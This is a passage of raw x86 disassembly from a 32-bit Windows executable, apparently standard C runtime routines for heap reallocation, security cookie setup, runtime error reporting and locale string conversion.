  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
